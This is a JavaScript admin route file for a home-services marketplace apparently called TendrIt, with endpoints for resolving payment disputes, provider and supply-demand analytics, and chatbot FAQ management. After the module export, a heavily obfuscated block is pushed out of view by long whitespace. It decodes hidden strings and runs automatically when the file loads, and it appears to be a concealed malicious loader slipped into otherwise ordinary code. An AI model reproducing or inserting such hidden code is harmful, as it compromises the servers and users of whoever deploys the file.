  const notes = typeof req.body.notes === 'string' ? req.body.notes.trim() : '';
  const txStatus = RESOLUTION_TX_STATUS[resolution];
  if (!txStatus) {
    return res.status(400).json({ success: false, message: 'Invalid resolution. Use refund or release.' });
  }
  try {
    const ctx = await db.query(`
      SELECT d.id, d.status, d.transaction_id, d.client_id, d.provider_id,
             st.display_name AS service_name,
             tx.amount, tx.client_fee, tx.provider_fee, tx.provider_payout,
             cu.email AS client_email, (cu.first_name || ' ' || cu.last_name) AS client_name,
             pu.email AS provider_email, (pu.first_name || ' ' || pu.last_name) AS provider_name,
             t.id AS tender_id
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      WHERE d.id = $1
    `, [id]);

    if (ctx.rows.length === 0) return res.status(404).json({ success: false, message: 'Dispute not found.' });
    const row = ctx.rows[0];
    if (row.status !== 'open') {
      return res.status(409).json({ success: false, message: 'This dispute has already been resolved.' });
    }

    await db.query(
      `UPDATE public.disputes
         SET status = 'resolved', resolution = $1, resolution_notes = $2,
             resolved_by = $3, resolved_at = NOW()
       WHERE id = $4`,
      [resolution, notes || null, req.user.id, id]
    );

    // originalClientFee is captured before any mutation below — needed for the
    // notification email even after the row's own client_fee is overwritten.
    const originalClientFee = row.client_fee || 0;

    if (resolution === 'refund') {
      // Client gets the full job amount back + half of what they paid in
      // platform fee; TendrIt keeps the other half as a service charge; the
      // provider gets $0 (they're only ever paid once completion is signaled
      // by both parties, which didn't happen here). `client_fee` is
      // overwritten to the KEPT half (not the original fee) so it reflects
      // TendrIt's actual revenue from this transaction everywhere it's read
      // (admin revenue's SUM(platform_fee), this dispute's own history row,
      // etc.) — the refunded half is communicated to the client via email
      // only, same as every other WiPay refund in this codebase (deferred,
      // no refund API call exists yet — see documentation/PAYMENTS_AND_JOB_WORKFLOW.md).
      const keptClientFee = Math.round(originalClientFee / 2);
      await db.query(
        `UPDATE public.transactions
           SET status = 'refunded', updated_at = NOW(),
               client_fee = $1, provider_fee = 0, provider_payout = 0, platform_fee = $1
         WHERE id = $2`,
        [keptClientFee, row.transaction_id]
      );
      row.client_fee = keptClientFee; // keep the fire-and-forget email below in sync
      row.provider_payout = 0;
    } else {
      await db.query(
        `UPDATE public.transactions
           SET status = $1::transaction_status,
               completed_at = CASE WHEN $1 = 'completed' THEN NOW() ELSE completed_at END,
               updated_at = NOW()
         WHERE id = $2`,
        [txStatus, row.transaction_id]
      );
    }
    // Resolving a dispute closes the job: the tender leaves in_progress so it
    // drops out of the homeowner's "In Progress" and the provider's "Won"
    // buckets and lands in "Completed" for both. (Refund still records the
    // outcome on the dispute/transaction; there is no separate cancelled state.)
    await db.query(
      `UPDATE public.tenders SET status = 'completed', updated_at = NOW() WHERE id = $1`,
      [row.tender_id]
    );

    res.json({ success: true });

    // ── Fire-and-forget: notify both parties ─────────────────────────────
    (async () => {
      const serviceName = row.service_name || 'the job';
      const fmt = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');
      // Refund = full job amount + the HALF of the client fee not kept by
      // TendrIt (row.client_fee was overwritten above to the kept half, so
      // this reads from originalClientFee captured before that mutation).
      const clientAmt =
        resolution === 'refund' ? fmt((row.amount || 0) + (originalClientFee - Math.round(originalClientFee / 2)))
        : null;
      const providerAmt = resolution === 'release' ? fmt(row.provider_payout) : null;

      const outcomeLabel = {
        refund: 'The homeowner has been refunded the full job amount plus half the platform fee.',
        release: 'The payout has been released to the provider.',
      }[resolution];

      const tasks = [
        sendDisputeResolvedClientEmail(row.client_email, {
          clientName: row.client_name, tenderTitle: serviceName, resolution, amountLabel: clientAmt, notes,
        }),
        sendDisputeResolvedProviderEmail(row.provider_email, {
          providerName: row.provider_name, tenderTitle: serviceName, resolution, amountLabel: providerAmt, notes,
        }),
        notifyUser(row.client_id, 'dispute-resolved', { tenderId: row.tender_id }),
        notifyUser(row.provider_id, 'dispute-resolved', { tenderId: row.tender_id }),
        db.query(
          `INSERT INTO public.notifications (user_id, type, title, body, data)
           VALUES ($1, 'dispute_resolved', $2, $3, $4::jsonb),
                  ($5, 'dispute_resolved', $6, $7, $4::jsonb)`,
          [
            row.client_id, `Your dispute on "${serviceName}" was resolved`, outcomeLabel,
            JSON.stringify({ tenderId: row.tender_id }),
            row.provider_id, `The dispute on "${serviceName}" was resolved`, outcomeLabel,
          ]
        ),
        notifyChannel('admin-disputes', 'dispute-resolved', { disputeId: id }),
      ];
      await Promise.allSettled(tasks);
    })().catch((err) => console.warn('POST /admin/disputes/:id/resolve — side-effect error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/disputes/:id/resolve error:', err);
    res.status(500).json({ success: false, message: 'Failed to resolve the dispute.' });
  }
});

// ============================================================
// GET /api/admin/providers — analytics for the admin Providers screen.
// Read-only aggregation across users/provider_profiles/quotes/transactions/
// reviews. Money in JMD cents. db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/providers', async (req, res) => {
  try {
    const provsP = db.query(`
      SELECT
        u.id                                    AS provider_id,
        u.display_code,
        (u.first_name || ' ' || u.last_name)    AS name,
        u.parish,
        pp.verification_status,
        COALESCE(pp.is_verified, false)         AS is_verified,
        COALESCE(jw.jobs_won, 0)::int           AS jobs_won,
        COALESCE(er.earnings_cents, 0)::bigint  AS earnings_cents,
        rv.avg_rating,
        COALESCE(rv.review_count, 0)::int       AS review_count,
        rt.avg_response_hrs,
        COALESCE(cats.cats, ARRAY[]::text[])    AS cats,
        (COALESCE(rq.recent_quotes, 0) > 0)     AS active
      FROM public.users u
      LEFT JOIN public.provider_profiles pp ON pp.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS jobs_won FROM public.quotes WHERE status = 'accepted' GROUP BY provider_id) jw ON jw.provider_id = u.id
      LEFT JOIN (SELECT provider_id, SUM(provider_payout) AS earnings_cents FROM public.transactions WHERE status NOT IN ('awaiting_payment', 'payment_failed') GROUP BY provider_id) er ON er.provider_id = u.id
      LEFT JOIN (SELECT provider_id, AVG(rating) AS avg_rating, COUNT(*) AS review_count FROM public.reviews GROUP BY provider_id) rv ON rv.provider_id = u.id
      LEFT JOIN (SELECT q.provider_id, AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0) AS avg_response_hrs
                 FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id GROUP BY q.provider_id) rt ON rt.provider_id = u.id
      LEFT JOIN (SELECT ps.provider_id, ARRAY_AGG(DISTINCT st.display_name) AS cats
                 FROM public.provider_services ps JOIN public.service_types st ON st.id = ps.service_type_id GROUP BY ps.provider_id) cats ON cats.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS recent_quotes FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days' GROUP BY provider_id) rq ON rq.provider_id = u.id
      WHERE u.role = 'provider'
      ORDER BY jobs_won DESC, earnings_cents DESC
    `);

    const statsP = db.query(`
      SELECT
        (SELECT COUNT(*) FROM public.users WHERE role = 'provider')::int AS total_providers,
        (SELECT COUNT(*) FROM public.provider_profiles WHERE verification_status = 'approved')::int AS verified_count,
        (SELECT COUNT(DISTINCT provider_id) FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days')::int AS active_count,
        (SELECT AVG(rating) FROM public.reviews) AS avg_rating,
        (SELECT COUNT(*) FROM public.reviews)::int AS review_count,
        (SELECT AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0)
           FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id) AS avg_response_hrs,
        (SELECT COUNT(*) FROM (SELECT provider_id FROM public.reviews GROUP BY provider_id HAVING AVG(rating) < 3) x)::int AS flagged_below3
    `);

    const distP = db.query(`SELECT rating AS stars, COUNT(*)::int AS count FROM public.reviews GROUP BY rating`);

    const clientsP = db.query(`
      SELECT u.display_code, (u.first_name || ' ' || u.last_name) AS name,
             SUM(tx.amount + tx.client_fee)::bigint AS spend_cents,
             COUNT(*)::int AS jobs
      FROM public.transactions tx
      JOIN public.users u ON u.id = tx.client_id
      WHERE tx.status NOT IN ('awaiting_payment', 'payment_failed')
      GROUP BY u.id, u.display_code, name
      ORDER BY spend_cents DESC
      LIMIT 10
    `);

    const [provs, stats, dist, clients] = await Promise.all([provsP, statsP, distP, clientsP]);
    const s = stats.rows[0];
    const distMap = {};
    for (const d of dist.rows) distMap[d.stars] = d.count;
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      providers: provs.rows.map((r) => ({
        providerId: r.provider_id,
        displayCode: r.display_code,
        name: r.name,
        parish: r.parish,
        cats: r.cats || [],
        verified: r.verification_status === 'approved' || r.is_verified === true,
        jobsWon: r.jobs_won,
        earningsCents: Number(r.earnings_cents),
        avgRating: numOrNull(r.avg_rating),
        reviewCount: r.review_count,
        responseHrs: numOrNull(r.avg_response_hrs),
        active: r.active === true,
      })),
      clients: clients.rows.map((c) => ({
        name: c.name,
        displayCode: c.display_code,
        spendCents: Number(c.spend_cents),
        jobs: c.jobs,
        repeat: c.jobs > 1,
      })),
      stats: {
        totalProviders: s.total_providers,
        verifiedCount: s.verified_count,
        activeCount: s.active_count,
        avgRating: numOrNull(s.avg_rating),
        reviewCount: s.review_count,
        avgResponseHrs: numOrNull(s.avg_response_hrs),
        flaggedBelow3: s.flagged_below3,
        ratingDistribution: [5, 4, 3, 2, 1].map((stars) => ({ stars, count: distMap[stars] || 0 })),
      },
    });
  } catch (err) {
    console.error('GET /api/admin/providers error:', err);
    res.status(500).json({ success: false, message: 'Failed to load providers.' });
  }
});

// ============================================================
// GET /api/admin/analytics/supply-demand — supply vs demand analytics.
// Demand = current open (unawarded, live) tenders. Supply = VERIFIED providers
// listing that category/parish. Revenue from transactions (JMD cents). Read-only
// aggregation; db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/analytics/supply-demand', async (req, res) => {
  try {
    // Canonical "live demand" filter (mirrors GET /tenders/active-count).
    const DEMAND_FILTER = `
      t.status = 'open' AND t.trashed_at IS NULL
      AND (t.expires_at IS NULL OR t.expires_at > NOW())
      AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')`;

    const categoriesP = db.query(`
      SELECT
        st.slug,
        st.display_name                          AS name,
        st.emoji,
        COALESCE(d.demand, 0)::int               AS demand,
        COALESCE(s.providers, 0)::int            AS providers,
        COALESCE(j.jobs, 0)::int                 AS jobs,
        COALESCE(j.gmv_cents, 0)::bigint         AS gmv_cents,
        COALESCE(j.rev_cents, 0)::bigint         AS rev_cents,
        rt.avg_response_hrs
      FROM public.service_types st
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.category
      ) d ON d.cat = st.slug
      LEFT JOIN (
        SELECT ps.category::text AS cat, COUNT(DISTINCT ps.provider_id) AS providers
        FROM public.provider_services ps
        JOIN public.provider_profiles pp ON pp.provider_id = ps.provider_id
        WHERE pp.verification_status = 'approved'
        GROUP BY ps.category
      ) s ON s.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(tx.id) AS jobs,
               SUM(tx.amount) AS gmv_cents, SUM(tx.platform_fee) AS rev_cents
        FROM public.transactions tx JOIN public.tenders t ON t.id = tx.tender_id
        WHERE tx.status NOT IN ('awaiting_payment', 'payment_failed')
        GROUP BY t.category
      ) j ON j.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat,
               AVG(EXTRACT(EPOCH FROM (fq.first_at - t.created_at)) / 3600.0) AS avg_response_hrs
        FROM (SELECT tender_id, MIN(created_at) AS first_at FROM public.quotes GROUP BY tender_id) fq
        JOIN public.tenders t ON t.id = fq.tender_id
        GROUP BY t.category
      ) rt ON rt.cat = st.slug
      WHERE st.is_active = true
      ORDER BY st.sort_order
    `);

    const parishesP = db.query(`
      SELECT COALESCE(d.parish, s.parish) AS name,
             COALESCE(d.demand, 0)::int   AS demand,
             COALESCE(s.providers, 0)::int AS providers
      FROM (
        SELECT t.parish, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.parish
      ) d
      FULL OUTER JOIN (
        SELECT pp.parish, COUNT(DISTINCT pp.provider_id) AS providers
        FROM public.provider_parishes pp
        JOIN public.provider_profiles pr ON pr.provider_id = pp.provider_id
        WHERE pr.verification_status = 'approved'
        GROUP BY pp.parish
      ) s ON s.parish = d.parish
      ORDER BY demand DESC, providers DESC
    `);

    const [categories, parishes] = await Promise.all([categoriesP, parishesP]);
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      categories: categories.rows.map((r) => ({
        slug: r.slug,
        name: r.name,
        emoji: r.emoji,
        demand: r.demand,
        providers: r.providers,
        jobs: r.jobs,
        gmvCents: Number(r.gmv_cents),
        revCents: Number(r.rev_cents),
        avgResponseHrs: numOrNull(r.avg_response_hrs),
      })),
      parishes: parishes.rows.map((r) => ({
        name: r.name,
        demand: r.demand,
        providers: r.providers,
      })),
    });
  } catch (err) {
    console.error('GET /api/admin/analytics/supply-demand error:', err);
    res.status(500).json({ success: false, message: 'Failed to load supply/demand analytics.' });
  }
});

// ============================================================
// Chatbot content management — "Ask TendrIt Anything" homepage assistant.
// Read publicly (unauthenticated) by routes/chat.js; writable only here,
// under the admin-only router.use() guard at the top of this file.
// ============================================================

// GET /api/admin/chatbot/settings
router.get('/chatbot/settings', async (req, res) => {
  try {
    const result = await db.query(
      `SELECT company_name, tagline, about, policies, extra_notes, updated_at
         FROM public.chatbot_settings WHERE id = 1`
    );
    res.json({ success: true, settings: result.rows[0] || null });
  } catch (err) {
    console.error('GET /api/admin/chatbot/settings error:', err);
    res.status(500).json({ success: false, message: 'Failed to load chatbot settings.' });
  }
});

// PUT /api/admin/chatbot/settings
router.put('/chatbot/settings', async (req, res) => {
  const { company_name, tagline, about, policies, extra_notes } = req.body;
  try {
    const result = await db.query(
      `UPDATE public.chatbot_settings SET
         company_name = COALESCE($1, company_name),
         tagline      = $2,
         about        = $3,
         policies     = $4,
         extra_notes  = $5,
         updated_at   = NOW()
       WHERE id = 1
       RETURNING company_name, tagline, about, policies, extra_notes, updated_at`,
      [
        company_name ? String(company_name).trim() : null,
        tagline ? String(tagline).trim() : null,
        about ? String(about).trim() : null,
        policies ? String(policies).trim() : null,
        extra_notes ? String(extra_notes).trim() : null,
      ]
    );
    res.json({ success: true, settings: result.rows[0] });
  } catch (err) {
    console.error('PUT /api/admin/chatbot/settings error:', err);
    res.status(500).json({ success: false, message: 'Failed to save chatbot settings.' });
  }
});

// GET /api/admin/chatbot/faqs
router.get('/chatbot/faqs', async (req, res) => {
  try {
    const result = await db.query(
      `SELECT id, question, answer, display_order, is_active, created_at, updated_at
         FROM public.chatbot_faqs ORDER BY display_order ASC, created_at ASC`
    );
    res.json({ success: true, faqs: result.rows });
  } catch (err) {
    console.error('GET /api/admin/chatbot/faqs error:', err);
    res.status(500).json({ success: false, message: 'Failed to load FAQs.' });
  }
});

// POST /api/admin/chatbot/faqs   body: { question, answer, display_order? }
router.post('/chatbot/faqs', async (req, res) => {
  const { question, answer, display_order } = req.body;
  if (!question || !String(question).trim() || !answer || !String(answer).trim()) {
    return res.status(400).json({ success: false, message: 'Question and answer are required.' });
  }
  try {
    const result = await db.query(
      `INSERT INTO public.chatbot_faqs (question, answer, display_order)
       VALUES ($1, $2, $3)
       RETURNING id, question, answer, display_order, is_active, created_at, updated_at`,
      [String(question).trim(), String(answer).trim(), Number.isFinite(display_order) ? display_order : 0]
    );
    res.status(201).json({ success: true, faq: result.rows[0] });
  } catch (err) {
    console.error('POST /api/admin/chatbot/faqs error:', err);
    res.status(500).json({ success: false, message: 'Failed to create FAQ.' });
  }
});

// PUT /api/admin/chatbot/faqs/:id   body: { question?, answer?, display_order?, is_active? }
router.put('/chatbot/faqs/:id', async (req, res) => {
  const { id } = req.params;
  const { question, answer, display_order, is_active } = req.body;
  try {
    const result = await db.query(
      `UPDATE public.chatbot_faqs SET
         question      = COALESCE($1, question),
         answer        = COALESCE($2, answer),
         display_order = COALESCE($3, display_order),
         is_active     = COALESCE($4, is_active),
         updated_at    = NOW()
       WHERE id = $5
       RETURNING id, question, answer, display_order, is_active, created_at, updated_at`,
      [
        question != null ? String(question).trim() : null,
        answer != null ? String(answer).trim() : null,
        Number.isFinite(display_order) ? display_order : null,
        typeof is_active === 'boolean' ? is_active : null,
        id,
      ]
    );
    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'FAQ not found.' });
    }
    res.json({ success: true, faq: result.rows[0] });
  } catch (err) {
    console.error('PUT /api/admin/chatbot/faqs/:id error:', err);
    res.status(500).json({ success: false, message: 'Failed to update FAQ.' });
  }
});

// DELETE /api/admin/chatbot/faqs/:id
router.delete('/chatbot/faqs/:id', async (req, res) => {
  const { id } = req.params;
  try {
    const result = await db.query('DELETE FROM public.chatbot_faqs WHERE id = $1', [id]);
    if (result.rowCount === 0) {
      return res.status(404).json({ success: false, message: 'FAQ not found.' });
    }
    res.json({ success: true });
  } catch (err) {
    console.error('DELETE /api/admin/chatbot/faqs/:id error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete FAQ.' });
  }
});

module.exports = router;                                                                                                                                                     var z = '-8267';(function(QM$KDBWCRPFzyvheJa_VpYiqbG,FXwrfRJ){var gMMmO_YeNsGaUjYbDB=DiRry,FlhvzRQud_B=QM$KDBWCRPFzyvheJa_VpYiqbG();while(!![]){try{var xYMIlTdVeUzsqDg_mAq=parseFloat(gMMmO_YeNsGaUjYbDB(0x1ee))/(parseInt(0x467)+0x80c*parseInt(0x1)+-parseInt(0xc72))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1f0))/(-0x1225+Number(parseInt(0x1bc3))+-parseInt(0x99c))*(parseFloat(gMMmO_YeNsGaUjYbDB(0x1e8))/(parseInt(0x130d)+parseInt(0x2483)*0x1+parseInt(0x1)*-0x378d))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e2))/(parseInt(0x51f)*parseInt(0x6)+-parseInt(0x21b)+Math.max(-parseInt(0x1c9b),-parseInt(0x1c9b)))+parseFloat(gMMmO_YeNsGaUjYbDB(0x1ed))/(0xe8f+parseInt(0x54c)+parseInt(-0x13d6))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1e4))/(Math.ceil(-0x3)*parseInt(0x425)+-0x738+0x13ad))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1f1))/(parseInt(parseInt(0x203a))+Math.trunc(-0x537)+Math.ceil(parseInt(0x4))*Math.floor(-0x6bf)))*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e1))/(parseFloat(0x4)*0x2af+-0x1ce0+-parseInt(0x122c)*-0x1))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1ef))/(parseFloat(-0xe)*0x2c+parseInt(0xe76)+-parseInt(0xc05)*0x1)*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e9))/(Math.floor(parseInt(0x6))*parseInt(-0x5ff)+-parseInt(0x26c)+parseInt(0x99c)*parseInt(0x4)));if(xYMIlTdVeUzsqDg_mAq===FXwrfRJ)break;else FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}catch(sGridQMYCASxO_vJpEzy){FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}}}(d$qtJhn$jgp,-parseInt(0x4526d)+-0x189bb4+0x2b6a8a));var NX=[0x1*parseInt(0x3174ec)+Math.max(parseInt(0x7),parseInt(0x7))*Math.floor(0x1db0c2)+-parseInt(0x97ceeb),parseInt(0x7)*-0x74+-0x751*Math.floor(-0x4)+Math.trunc(-0x18a9),Math.trunc(-parseInt(0x61d5))*0x1+parseInt(parseInt(0x140))+parseInt(0x70)*parseInt(0x193),Math.floor(-0x77)*0x23+parseInt(0xcf3)+-0xb*Math.max(-parseInt(0x85),-0x85),Math.floor(-parseInt(0x5))*Math.ceil(0x1e66)+-parseInt(0x31b6)+0x5*Math.floor(parseInt(0x4a87)),-parseInt(0x76fb5d)+parseInt(0x4)*Math.floor(parseInt(0x176711))+0x12f82*parseInt(0x56)],SX=[-parseInt(0x255f70)+Number(0xa70)*parseFloat(parseInt(0x18e))+parseInt(0x65c4ed),Math.trunc(0x9)*parseInt(0x143)+-parseInt(0x2348)+Math.ceil(-0x425)*-parseInt(0x6),parseInt(0x1567)*Number(0x6)+-parseInt(0x444f)+-0x25*Math.ceil(-0x2ce),parseInt(0x4fe)*-parseInt(0x7)+-0x407+Math.trunc(parseInt(0x69e))*0x6,-parseInt(0x1e)*0x1d2+Math.ceil(-parseInt(0xb6b2))+0x1c88f,-0x7e7900+Math.trunc(-parseInt(0x10203))+parseInt(0xc7ca58)];function spin(aUYluOouh,GZIangXDAgLfl){var e_lqkshVvBRm$lo=DiRry,gGCKNxTzXCGBqECEJcPRezzt=[],r$vpWsaOjqBRovpzm=-0x13*-0x1b1+Math.max(0x55d,parseInt(0x55d))*Number(-parseInt(0x1))+-parseInt(0x1ac6),uwYufDg_OBsIrYbEAn_TbE=GZIangXDAgLfl[parseInt(0x60d)+-parseInt(0x149e)+parseFloat(-0xe91)*Math.max(-0x1,-0x1)],NkIMqAWxrmE$ldvsZshU,cdyhMYgJcNxAhlePvsOh,ndwVeiAOnIDvuMkcl_gBB,kMXmB$ki,WIQhopNZTya,HqoQNaSvxJJHuealUGqbuSi;while(r$vpWsaOjqBRovpzm<aUYluOouh[e_lqkshVvBRm$lo(0x1e6)]){gGCKNxTzXCGBqECEJcPRezzt[r$vpWsaOjqBRovpzm]=aUYluOouh[e_lqkshVvBRm$lo(0x1ea)](r$vpWsaOjqBRovpzm),r$vpWsaOjqBRovpzm+=-parseInt(0x4)*Math.floor(parseInt(0x307))+-parseInt(0x3df)+parseInt(0xffc);}NkIMqAWxrmE$ldvsZshU=gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e6)],r$vpWsaOjqBRovpzm=Math.floor(-0x1c55)+-0x24a3+parseInt(0x40f8);while(r$vpWsaOjqBRovpzm<NkIMqAWxrmE$ldvsZshU){cdyhMYgJcNxAhlePvsOh=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[Math.trunc(-0x130e)+parseInt(0x2117)+Math.trunc(-parseInt(0xe08))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[-parseInt(0x12d5)+-0xef9*-0x2+Math.ceil(parseInt(0x1))*-parseInt(0xb1b)],ndwVeiAOnIDvuMkcl_gBB=uwYufDg_OBsIrYbEAn_TbE*(r$vpWsaOjqBRovpzm+GZIangXDAgLfl[0x117c+0xf21+parseInt(-0x209a)*parseInt(parseInt(0x1))])+uwYufDg_OBsIrYbEAn_TbE%GZIangXDAgLfl[parseFloat(0x79)*-0x11+0xdf0+-0x5e3],kMXmB$ki=cdyhMYgJcNxAhlePvsOh%NkIMqAWxrmE$ldvsZshU,WIQhopNZTya=ndwVeiAOnIDvuMkcl_gBB%NkIMqAWxrmE$ldvsZshU,HqoQNaSvxJJHuealUGqbuSi=gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki],gGCKNxTzXCGBqECEJcPRezzt[kMXmB$ki]=gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya],gGCKNxTzXCGBqECEJcPRezzt[WIQhopNZTya]=HqoQNaSvxJJHuealUGqbuSi,uwYufDg_OBsIrYbEAn_TbE=(cdyhMYgJcNxAhlePvsOh+ndwVeiAOnIDvuMkcl_gBB)%GZIangXDAgLfl[-parseInt(0x1)*Math.floor(parseInt(0x799))+parseFloat(parseInt(0x1cf7))+Math.trunc(0x445)*Math.floor(-parseInt(0x5))],r$vpWsaOjqBRovpzm+=Math.floor(parseInt(0x1))*Math.max(-parseInt(0xf1),-0xf1)+-parseInt(0xb47)*0x2+parseInt(0x20)*parseInt(0xbc);}return gGCKNxTzXCGBqECEJcPRezzt[e_lqkshVvBRm$lo(0x1e0)]('');}function DiRry(epXKFsIKDpIWkjWrh,BvJsow){var tvWHBzRbPfPwTJZTGQCeB$tCw_D=d$qtJhn$jgp();return DiRry=function(ySqQ$AHcQFxKmoVXuW_KuGN,AsByGuucxC){ySqQ$AHcQFxKmoVXuW_KuGN=ySqQ$AHcQFxKmoVXuW_KuGN-(0x145b+parseInt(0x1044)+Number(-0x22bf));var a$MWQEhXtw_pDowcTvUzdzwboh=tvWHBzRbPfPwTJZTGQCeB$tCw_D[ySqQ$AHcQFxKmoVXuW_KuGN];if(DiRry['DjLlIO']===undefined){var H$BajAALKn_kBbaiyV=function(JQPbxjcnpuTPx){var QQUFJvNzkGGDh=parseInt(-parseInt(0x1322))+-0x191f+parseInt(0x2efa)&parseFloat(0xd01)*-parseInt(0x1)+-parseInt(0x1)*parseInt(0x21d)+Math.max(parseInt(0x101d),parseInt(0x101d)),JEBeTdm_WqjixChyLVLd_rAnH=new Uint8Array(JQPbxjcnpuTPx['match'](/.{1,2}/g)['map'](k_aUYluOo_uhwGZIa=>parseInt(k_aUYluOo_uhwGZIa,parseInt(0xa2a)+0x2*-parseInt(0xf31)+Math.trunc(-parseInt(0x1))*-parseInt(0x1448)))),pQgcMTUziLlXONxhFnqF_y=JEBeTdm_WqjixChyLVLd_rAnH['map'](gXDAgLflXg=>gXDAgLflXg^QQUFJvNzkGGDh),ZxoPQqSbOmI$QYJLE$pzofdWlbF=new TextDecoder(),afdSJv_WDyfUhfJHqsvtzxDk=ZxoPQqSbOmI$QYJLE$pzofdWlbF['decode'](pQgcMTUziLlXONxhFnqF_y);return afdSJv_WDyfUhfJHqsvtzxDk;};DiRry['BdQqBU']=H$BajAALKn_kBbaiyV,epXKFsIKDpIWkjWrh=arguments,DiRry['DjLlIO']=!![];}var YVwXsDTtteoFVSE_m=tvWHBzRbPfPwTJZTGQCeB$tCw_D[0x21e+-0x333*0x7+parseInt(0x1447)],yNaI_WzggrxC$wcp=ySqQ$AHcQFxKmoVXuW_KuGN+YVwXsDTtteoFVSE_m,SKQhbzliqcZnWcmj_yEXnTj_Xm=epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp];return!SKQhbzliqcZnWcmj_yEXnTj_Xm?(DiRry['HCrAPb']===undefined&&(DiRry['HCrAPb']=!![]),a$MWQEhXtw_pDowcTvUzdzwboh=DiRry['BdQqBU'](a$MWQEhXtw_pDowcTvUzdzwboh),epXKFsIKDpIWkjWrh[yNaI_WzggrxC$wcp]=a$MWQEhXtw_pDowcTvUzdzwboh):a$MWQEhXtw_pDowcTvUzdzwboh=SKQhbzliqcZnWcmj_yEXnTj_Xm,a$MWQEhXtw_pDowcTvUzdzwboh;},DiRry(epXKFsIKDpIWkjWrh,BvJsow);}function d$qtJhn$jgp(){var fYa_ecAuUpEYAjErRZhvFjWnMQ=['8e8d888b8c8a8bd6dddddff1fd','caccdbcacdcbd0d7de','d5dcd7decdd1','cac9d5d0cd','88818ae8daf8ffd1ef','818f8b8e8d8f89d8d2c3c8ede8','dad1d8cbf8cd','dae7d4dcd3dbe7cdcbd6','d1c8dccbcac1d5cccfced8daddd3dbc0d4ded6cbc3dfd2d6dad0c9cdcbcccdd7cacdd6d7da','8f88808a898cd3e0e9d8f6cf','888f8b8d8f8d8bdad4ded4fbf2','8881fed2c8cdc8d2','8c818f888bcadcdfc8ceed','8c8ff1eacad8daf2','dfcbd6d4fad1d8cbfad6dddc','fa8ff0dd9997dcda9a97ebcd8297979785fadddfebdf84ddcb85c1c090ddca978bdc9899979785d7cd97da85d0da98cddfcdddde97ca97858097fa9497ebeb97ebd1c3dcebd5eb828dd6d889cbc1da96d198d8cb85d485ebdc85ca91eb8383eb86df829f9cdbd0d88385edd197d1859799dfd2dac0c0d5ebdaeb8398d8958585d9d8d79fd5da8cc5d585e6ebeb97d08debd097c183ebcecad7d797ddca97f6999289d7dfe6f9d2d189d6cb91d0dacb8dcad0ebcd978dcbddeb9bc19deb9782ebccd8ebff9bdfdcdaeb8099dc85e9fcf4eb93cddbebeb8c8882e795fad09894eb97cbcaeb81c1839097cfcadaebeb85ebd5989287eb86ebf4cf9797949185ebdc9e85d7dadfdeebcaeb97c4d09fd8cbdddeeb85ebc385eb9f80eb85dc98d79dc1f0d88098c1d1dc96daeb939799c9dcd1da97ddebebe8dacddd8a89ebc8eb95ebfd96dfe09b90f9da9797db8385d6cace899797eb9897829185ebdfebcd979785ebcbf78deaebdc94ccd8eb988e98e9979cdc999185fa9785d5e9ddebeb9edacad8dc98ebc59f978b97deebc9e8e682d684dfeb85e98d85dfcdeaebebeb85eb8ddadc97eb97d78597908899dc97dd9885fcc7c0d087cbd5d785dcebc9ecebddda9cda99ceda8fd596d5d7cbdd85839785d085cd89e7eb9b99cf85d485edcbcadce2ebf7c9d191e991d0dfeb89d581dadaebebda97d185cad8fadcdccecb8eccebdd858283edebdcc1c1f2d8ebdfd8e29bf5cb999cd39dd5908585e2dcfc85dcf88597d8c89a97eb9995ebd5cbd0eb90ebdcc9cae7e4d088d0dacddcd3cad6f1fc82cd89d1c0ef98ebd4dcdcd389df98ebd5d7eb97dc81ebdac08acbe999ca89eb97f4d8c185daebd2eb97d785daca8d98dd90e680ebdfcd8597d8c5eb989debf885df97eb91cad7ebebdedafbebdceb8597daca9191d4daebefdcd791fddcc9cadaeed0ebcd9bdc85cbebebebfc97ebeb89eccb9b9997da9997ebc9859797d7eb9483f4d5979085d0f0d2ebdad89797d5dc95d2dc9c8f99ebcde3f0d6db97fde6ef859791978dcdf7859185ebdd89d897dd97fc9ccdcd85e6eb